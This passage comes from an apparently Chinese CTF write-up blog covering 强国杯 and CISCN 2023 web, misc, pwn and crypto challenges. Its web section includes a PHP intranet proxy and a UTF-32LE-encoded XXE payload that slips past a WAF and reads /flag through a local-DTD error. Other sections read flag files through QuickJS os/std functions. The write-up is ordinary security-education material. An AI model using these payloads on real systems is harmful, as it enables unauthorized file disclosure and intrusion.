class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]) == <span class="hljs-string">&#x27;POST&#x27;</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">// 是get</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_get</span>(<span class="hljs-params"></span>): <span class="hljs-title">bool</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]) == <span class="hljs-string">&#x27;GET&#x27;</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">// 生成内网网址：把外网网址解析到内网网址</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">make_request_url</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>, <span class="hljs-variable">$intranet</span></span>): <span class="hljs-title">string</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$intranet</span>, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_url</span>()); <span class="hljs-comment">// 实际代理地址（就是替换主网址或路径）</span><br>    &#125;<br> <br>    <span class="hljs-comment">// 转发接口</span><br>    <span class="hljs-comment">// 请从此处调用</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">request_intranet</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>, <span class="hljs-variable">$intranet</span></span>): <span class="hljs-title">string</span></span>&#123;<br>        <span class="hljs-comment">// 测试的内网请求地址：$request_url = http://127.0.0.l:8000/api.gen1/admin</span><br>        <span class="hljs-variable">$request_url</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">make_request_url</span>(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$intranet</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">is_post</span>())&#123;<br>            <span class="hljs-variable">$request_array</span> = <span class="hljs-variable">$_REQUEST</span>; <span class="hljs-comment">// 请求参数数组</span><br>            <span class="hljs-variable">$back</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">request_option</span>(<span class="hljs-variable">$request_url</span>, <span class="hljs-string">&#x27;post&#x27;</span>, <span class="hljs-variable">$request_array</span>, <span class="hljs-literal">false</span>);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">is_get</span>())&#123;<br>            <span class="hljs-variable">$request_array</span> = [];<br>            <span class="hljs-variable">$back</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">request_option</span>(<span class="hljs-variable">$request_url</span>, <span class="hljs-string">&#x27;get&#x27;</span>, <span class="hljs-variable">$request_array</span>, <span class="hljs-literal">false</span>);<br>        &#125; <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$back</span> = <span class="hljs-string">&#x27;&#123;&quot;state&quot;:0, &quot;msg&quot;:&quot;method error. method is only in [get, post], options etc be not supported.&quot;, &quot;content&quot;:&quot;&quot;&#125;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$back</span>;<br>    &#125;<br><br>&#125;<br><br><br><span class="hljs-comment">// 返回数据</span><br><span class="hljs-variable">$host</span> = <span class="hljs-string">&quot;http://82.157.177.192:46728&quot;</span>; <span class="hljs-comment">// 外网网址（主网址或有部分路径）</span><br><span class="hljs-variable">$intranet</span> = <span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>; <span class="hljs-comment">// 内网网址（主网址或有部分路径）</span><br><span class="hljs-variable">$php_proxy</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">php_proxy</span>();<br><span class="hljs-variable">$back</span> = <span class="hljs-variable">$php_proxy</span>-&gt;<span class="hljs-title function_ invoke__">request_intranet</span>(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$intranet</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$back</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>之后访问<code>http://IP:PORT/proxy.php/index</code>，就相当于访问<code>http://InnerIP:InnerPORT/index</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-ezweb_new-6.png"></p>
<p>抓包一看，很明显的<code>XXE</code></p>
<p>fuzz一下，可恶，竟然还有waf</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-ezweb_new-7.png"></p>
<p>可以利用编码转换绕过waf<br><code>iconv -f utf8 -t UTF-32LE  1.xml &gt; 2.xml</code></p>
<p>这里放一个编码后的payload（本地dtd读文件报错带flag）：<br><code>%3C%00%00%00%3F%00%00%00x%00%00%00m%00%00%00l%00%00%00+%00%00%00v%00%00%00e%00%00%00r%00%00%00s%00%00%00i%00%00%00o%00%00%00n%00%00%00%3D%00%00%00%22%00%00%001%00%00%00.%00%00%000%00%00%00%22%00%00%00+%00%00%00%3F%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00%3C%00%00%00%21%00%00%00D%00%00%00O%00%00%00C%00%00%00T%00%00%00Y%00%00%00P%00%00%00E%00%00%00+%00%00%00m%00%00%00e%00%00%00s%00%00%00s%00%00%00a%00%00%00g%00%00%00e%00%00%00+%00%00%00%5B%00%00%00%0D%00%00%00%0A%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%25%00%00%00+%00%00%00l%00%00%00o%00%00%00c%00%00%00a%00%00%00l%00%00%00_%00%00%00d%00%00%00t%00%00%00d%00%00%00+%00%00%00S%00%00%00Y%00%00%00S%00%00%00T%00%00%00E%00%00%00M%00%00%00+%00%00%00%22%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00%3A%00%00%00%2F%00%00%00%2F%00%00%00%2F%00%00%00t%00%00%00m%00%00%00p%00%00%00%2F%00%00%001%00%00%00.%00%00%00d%00%00%00t%00%00%00d%00%00%00%22%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%25%00%00%00+%00%00%00c%00%00%00o%00%00%00n%00%00%00d%00%00%00i%00%00%00t%00%00%00i%00%00%00o%00%00%00n%00%00%00+%00%00%00%27%00%00%00a%00%00%00a%00%00%00a%00%00%00%29%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00+%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00+%00%00%00S%00%00%00Y%00%00%00S%00%00%00T%00%00%00E%00%00%00M%00%00%00+%00%00%00%22%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00%3A%00%00%00%2F%00%00%00%2F%00%00%00%2F%00%00%00f%00%00%00l%00%00%00a%00%00%00g%00%00%00%22%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00+%00%00%00e%00%00%00v%00%00%00a%00%00%00l%00%00%00+%00%00%00%22%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%006%00%00%00%3B%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00+%00%00%00e%00%00%00r%00%00%00r%00%00%00o%00%00%00r%00%00%00+%00%00%00S%00%00%00Y%00%00%00S%00%00%00T%00%00%00E%00%00%00M%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%007%00%00%00%3B%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00%3A%00%00%00%2F%00%00%00%2F%00%00%00%2F%00%00%00n%00%00%00o%00%00%00n%00%00%00e%00%00%00x%00%00%00i%00%00%00s%00%00%00t%00%00%00e%00%00%00n%00%00%00t%00%00%00%2F%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00%3B%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%007%00%00%00%3B%00%00%00%3E%00%00%00%22%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00e%00%00%00v%00%00%00a%00%00%00l%00%00%00%3B%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00e%00%00%00r%00%00%00r%00%00%00o%00%00%00r%00%00%00%3B%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00L%00%00%00E%00%00%00M%00%00%00E%00%00%00N%00%00%00T%00%00%00+%00%00%00a%00%00%00a%00%00%00+%00%00%00%28%00%00%00b%00%00%00b%00%00%00%27%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%25%00%00%00l%00%00%00o%00%00%00c%00%00%00a%00%00%00l%00%00%00_%00%00%00d%00%00%00t%00%00%00d%00%00%00%3B%00%00%00%0D%00%00%00%0A%00%00%00%5D%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00%3C%00%00%00u%00%00%00s%00%00%00e%00%00%00r%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00u%00%00%00s%00%00%00e%00%00%00r%00%00%00n%00%00%00a%00%00%00m%00%00%00e%00%00%00%3E%00%00%00f%00%00%00l%00%00%00a%00%00%00g%00%00%00%3C%00%00%00%2F%00%00%00u%00%00%00s%00%00%00e%00%00%00r%00%00%00n%00%00%00a%00%00%00m%00%00%00e%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00p%00%00%00a%00%00%00s%00%00%00s%00%00%00w%00%00%00o%00%00%00r%00%00%00d%00%00%00%3E%00%00%00r%00%00%00o%00%00%00o%00%00%00t%00%00%00%3C%00%00%00%2F%00%00%00p%00%00%00a%00%00%00s%00%00%00s%00%00%00w%00%00%00o%00%00%00r%00%00%00d%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00%3C%00%00%00%2F%00%00%00u%00%00%00s%00%00%00e%00%00%00r%00%00%00%3E%00%00%00</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-ezweb_new-8.png"></p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Welcome-to-QGB"><a href="#Welcome-to-QGB" class="headerlink" title="Welcome_to_QGB"></a>Welcome_to_QGB</h2><p><code>V2VsY29tZV90b19RR0I=</code>base64解码得到<code>Welcome_to_QGB</code></p>
<h2 id="找找GIF"><a href="#找找GIF" class="headerlink" title="找找GIF"></a>找找GIF</h2><p>伪加密，09-&gt;00，取出aaa</p>
<p>aaa添加后缀png，修改高度，得到压缩包密码：<code>okv90D%&amp;ffgbd</code></p>
<p>解压得到bbb，添加gif头<code>GIF89a</code>，得到flag</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%89%BE%E6%89%BEGIF.png"></p>
<h2 id="大佬大佬"><a href="#大佬大佬" class="headerlink" title="大佬大佬"></a>大佬大佬</h2><p>lsb提取出png</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%A4%A7%E4%BD%AC%E5%A4%A7%E4%BD%AC-1.png"></p>
<p>修改高度得到flag</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%A4%A7%E4%BD%AC%E5%A4%A7%E4%BD%AC-2.png"></p>
<h2 id="The-fun-picture"><a href="#The-fun-picture" class="headerlink" title="The fun picture"></a>The fun picture</h2><p>爆破得到密码<code>gh89</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/The%20fun%20picture-1.png"></p>
<p>FUN添加后缀zip，解压后文件补上png头<code>89 50 4e 47</code>,得到二维码</p>
<p>扫码得到<code>ZmxhZ3tycjkwZm5uZW1kZnUwOGdma2ttdmVtZGszZm12NmZnYX0=</code></p>
<p>base64解码得到flag</p>
<h2 id="B-tCh"><a href="#B-tCh" class="headerlink" title="B@tCh"></a>B@tCh</h2><p><em>赛后复现</em></p>
<p><code>BatchEncryption</code>混淆的批处理文件</p>
<p>特征一般是开头的两个字节为<code>0xFF</code>、<code>0xFE</code>，存在类似<code>BatchEncryption Build 201610 By gwsbhqt@163.com</code>的作者信息</p>
<p>本题将作者信息去除了</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-B@tCh-1.png"></p>
<p>解密脚本，来自<a href="https://blog.csdn.net/Hunter98234/article/details/108672926">https://blog.csdn.net/Hunter98234/article/details/108672926</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Batch Decryption 202009 (BatchEncryption Build 201610)</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decryption</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (data[<span class="hljs-number">0</span>] == <span class="hljs-number">0xFF</span> <span class="hljs-keyword">and</span> data[<span class="hljs-number">1</span>] == <span class="hljs-number">0xFE</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Batch decryption bom error!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(data[<span class="hljs-number">2</span>:<span class="hljs-number">9</span>], encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) != <span class="hljs-string">&#x27; &amp;cls\r\n&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Batch decryption cls error!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(data[<span class="hljs-number">9</span>:<span class="hljs-number">60</span>], encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) != <span class="hljs-string">&#x27;::BatchEncryption Build 201610 By gwsbhqt@163.com\r\n&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Batch decryption build error!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">vars</span> = &#123;&#125;<br><br>    <span class="hljs-comment"># decryption line</span><br>    i = <span class="hljs-number">60</span><br>    l = <span class="hljs-built_in">len</span>(data)<br>    <span class="hljs-keyword">while</span> i &lt; l:<br>        i = run(<span class="hljs-built_in">vars</span>, data, i)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params"><span class="hljs-built_in">vars</span>, data, i</span>):<br>    buf = <span class="hljs-string">&#x27;&#x27;</span><br>    f = <span class="hljs-number">0</span><br>    t = <span class="hljs-number">0</span><br>    x = <span class="hljs-literal">False</span><br>    l = <span class="hljs-built_in">len</span>(data)<br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>        <span class="hljs-keyword">if</span> data[i] == <span class="hljs-number">0x0d</span> <span class="hljs-keyword">and</span> data[i+<span class="hljs-number">1</span>] == <span class="hljs-number">0x0a</span>:<br>            i += <span class="hljs-number">2</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># get %var:~x,y% %0</span><br>        <span class="hljs-keyword">if</span> data[i] == <span class="hljs-number">0x25</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> x:<br>                x = <span class="hljs-literal">True</span><br>                f = i<br>            <span class="hljs-keyword">else</span>:<br>                x = <span class="hljs-literal">False</span><br>                t = i<br>                rst = var_percent(data[f:t+<span class="hljs-number">1</span>], <span class="hljs-built_in">vars</span>)<br>                buf += rst<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> x:<br>                buf += <span class="hljs-built_in">str</span>(data[i:i+<span class="hljs-number">1</span>], encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> (f + <span class="hljs-number">1</span> == i) <span class="hljs-keyword">and</span> ((data[i] &gt;= <span class="hljs-number">0x30</span> <span class="hljs-keyword">and</span> data[i] &lt;= <span class="hljs-number">0x39</span>) <span class="hljs-keyword">or</span> data[i] == <span class="hljs-number">0x2a</span>):<br>                    x = <span class="hljs-literal">False</span><br>                    t = i<br>                    rst = <span class="hljs-built_in">str</span>(data[f:t+<span class="hljs-number">1</span>], encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br>                    buf += rst<br>        i += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> i &gt;= l:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-built_in">print</span>(buf)<br>    bufs = buf.split(<span class="hljs-string">&#x27;&amp;@&#x27;</span>)<br>    <span class="hljs-keyword">for</span> var <span class="hljs-keyword">in</span> bufs:<br>        <span class="hljs-keyword">if</span> var[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>] == <span class="hljs-string">&#x27;set &#x27;</span>:<br>            var = var[<span class="hljs-number">4</span>:]<br>            b = var.find(<span class="hljs-string">&#x27;=&#x27;</span>)<br>            <span class="hljs-built_in">vars</span>[var[<span class="hljs-number">0</span>:b]] = var[b+<span class="hljs-number">1</span>:].replace(<span class="hljs-string">&#x27;^^^&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> i<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">var_percent</span>(<span class="hljs-params">data, <span class="hljs-built_in">vars</span></span>):<br>    full = <span class="hljs-built_in">str</span>(data, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    buf = full[<span class="hljs-number">1</span>:<span class="hljs-built_in">len</span>(full)-<span class="hljs-number">1</span>]<br>    buf = buf.split(<span class="hljs-string">&#x27;:~&#x27;</span>)<br>    var = buf[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> var <span class="hljs-keyword">in</span> <span class="hljs-built_in">vars</span>:<br>        <span class="hljs-built_in">vars</span>[var] = os.getenv(var)<br>    ent = <span class="hljs-built_in">vars</span>[var]<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(buf) &gt; <span class="hljs-number">1</span>):<br>        l = <span class="hljs-built_in">len</span>(ent)<br>        buf = buf[<span class="hljs-number">1</span>].split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>        f = <span class="hljs-built_in">int</span>(buf[<span class="hljs-number">0</span>])<br>        t = <span class="hljs-built_in">int</span>(buf[<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">if</span> f &lt; <span class="hljs-number">0</span>:<br>            f, t = l + f, t<br>        rst = ent[f: f+t]<br>    <span class="hljs-keyword">else</span>:<br>        rst = full<br>    <span class="hljs-keyword">return</span> rst<br><br><br>encrypt_file = <span class="hljs-string">&#x27;./batch_decryption/Encrypted_01.txt&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    <span class="hljs-keyword">try</span>:<br>        file = <span class="hljs-built_in">open</span>(encrypt_file, <span class="hljs-string">&quot;rb&quot;</span>)<br>        data = file.read()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> err:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Batch decryption read error:&#x27;</span>, err)<br>        exit<br>    <span class="hljs-keyword">else</span>:<br>        file.close()<br><br>    decryption(data)<br></code></pre></td></tr></table></figure>

<p>修改下脚本，使它能适用于本题</p>
<p>因为附件中没有<code>Build 201610 By....</code>这串信息，所以将个判断去掉（17-19）<br>没有这个字符串后，bat内容也会从相应的60变为9（从@开始）</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-B@tCh-2.png"></p>
<p>95行改为文件名</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-B@tCh-3.png"></p>
<p>运行解密得到flag</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-B@tCh-4.png"></p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="qqjs-new"><a href="#qqjs-new" class="headerlink" title="qqjs_new"></a>qqjs_new</h2><p><em>非预期解</em></p>
<p>ida分析，看到<code>import * as std from &#39;std&#39;</code>和<code>import * as os from &#39;os&#39;</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qqjs_new-1.png"></p>
<p>所以输入<code>os</code>会返回模块中的函数<br>发现存在<code>readdir</code>，可以读目录</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qqjs_new-2.png"></p>
<p>找到flag文件位置<code>/home/ctf/flag</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qqjs_new-3.png"></p>
<p><code>std</code>模块中存在<code>loadFile</code>函数，可以读文件</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qqjs_new-4.png"></p>
<p>读flag</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qqjs_new-5.png"></p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><p><em>赛后复现</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> next_prime<br><span class="hljs-keyword">import</span> hashlib<br><br><br><br>p=<span class="hljs-number">165183720742741436051373219716388644270093189046466421563632727622389425827620783096218651072108769567350808642169644915755493944233905573858905774991122631609402471527613272585988802294622263573574301013199411535656758222265554222107815469076608655188293263358371274025455477828555535371028164366376886408977</span><br>q=<span class="hljs-number">120848273460784230746197749214740170558670241437030497317956826606952430354830550737450520592481405802317202852411775956584677841602475259120706429378240071206662182089399302414435162197602907213282222144680788273948123482886712835590321726087823477518087588076504167863011019333002124841000448268076303735731</span><br>e=<span class="hljs-number">33</span><br>c=<span class="hljs-number">10407733127291995335613764691145477155502676597183852092212444772475748406250517097288411248334115120781386833588013995106957807313657632637086223225958539244315092039575434338289689184523710991223212333496000621300008178955253701172159259970353872359828291763446333588873982621853358272632447440961028670921631505593309092190417674648927653583956106734654954561031328286272044755552317084498103486458373580383410475085969677647030080606373264155592552338785789990114607084241499363324045488462563945268471178702696791804080490936763759252660049728533344304874474003893472238560682850602644793844258072019357796047919</span><br><br><br>n = p*q<br><br>d = gmpy2.invert(<span class="hljs-number">11</span>, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))<br>c3 = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(c3)<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    i += <span class="hljs-number">1</span><br>    m, flag = gmpy2.iroot(c3, <span class="hljs-number">3</span>)<br>    <span class="hljs-built_in">print</span>(i)<br>    <span class="hljs-keyword">if</span> flag:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(m))<br>        exit()<br>    c3 = c3 + n<br></code></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>强国杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2023ciscn初赛wp</title>
    <url>/%E7%AB%9E%E8%B5%9B/2023ciscn%E5%88%9D%E8%B5%9Bwp.html</url>
    <content><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="签到卡"><a href="#签到卡" class="headerlink" title="签到卡"></a>签到卡</h2><p><code>print(open(&#39;/flag&#39;).read())</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-%E7%AD%BE%E5%88%B0%E5%8D%A1.png"></p>
<h2 id="被加密的生产流量"><a href="#被加密的生产流量" class="headerlink" title="被加密的生产流量"></a>被加密的生产流量</h2><p>追踪tcp流，数据提取出来base32</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-%E8%A2%AB%E5%8A%A0%E5%AF%86%E7%9A%84%E7%94%9F%E4%BA%A7%E6%B5%81%E9%87%8F-1.png"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-%E8%A2%AB%E5%8A%A0%E5%AF%86%E7%9A%84%E7%94%9F%E4%BA%A7%E6%B5%81%E9%87%8F-2.png"></p>
<h2 id="国粹"><a href="#国粹" class="headerlink" title="国粹"></a>国粹</h2><p>先分割<code>题目.png</code>中的小麻将到<code>output</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>w=<span class="hljs-number">0</span><br>h=<span class="hljs-number">0</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>a=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;题目.png&#x27;</span>)<br><br>w1,h1=a.size<br><span class="hljs-keyword">while</span> w&lt;w1:<br>    im=a.crop((w,h,w+<span class="hljs-number">53</span>,h+<span class="hljs-number">73</span>))<br>    im.save(os.path.join(<span class="hljs-string">&#x27;output&#x27;</span>,<span class="hljs-built_in">str</span>(w))+<span class="hljs-string">&#x27;.png&#x27;</span>)<br>    w+=<span class="hljs-number">53</span><br><br></code></pre></td></tr></table></figure>

<p>再将<code>a.png</code>和<code>k.png</code>中的小麻将去<code>output</code>找对应的索引值，分别作为纵坐标和横坐标画图得到<code>flag</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>a=cv2.imread(<span class="hljs-string">&quot;a.png&quot;</span>)<br>k=cv2.imread(<span class="hljs-string">&quot;k.png&quot;</span>)<br>w=<span class="hljs-built_in">len</span>(a[<span class="hljs-number">0</span>])<br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">import</span> os<br>path=<span class="hljs-string">&#x27;output/&#x27;</span><br>d=os.listdir(path)<br>d.remove(<span class="hljs-string">&quot;0.png&quot;</span>)<br>data=[[],[]]<br>Status=[<span class="hljs-literal">False</span>,<span class="hljs-literal">False</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">im1,im2,sind</span>):<br>    A=cv2.absdiff(im1,im2)<br>    <span class="hljs-keyword">if</span> np.count_nonzero(A) ==<span class="hljs-number">0</span> :<br>        Status[sind]=<span class="hljs-literal">True</span><br>        ind=<span class="hljs-built_in">int</span>(j.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span 